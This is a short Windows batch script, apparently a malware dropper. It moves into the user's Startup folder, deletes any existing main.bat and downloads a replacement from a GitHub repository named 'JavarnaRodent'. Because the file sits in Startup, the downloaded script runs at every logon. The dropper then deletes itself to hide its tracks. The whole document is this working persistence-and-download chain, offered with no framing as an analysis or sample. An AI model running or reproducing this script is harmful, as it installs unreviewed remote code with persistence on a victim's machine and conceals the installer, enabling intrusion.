cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
del main.bat 2>null
curl -o main.bat https://raw.githubusercontent.com/JavarnaHordy/JavarnaRodent/main/main.bat
del %0
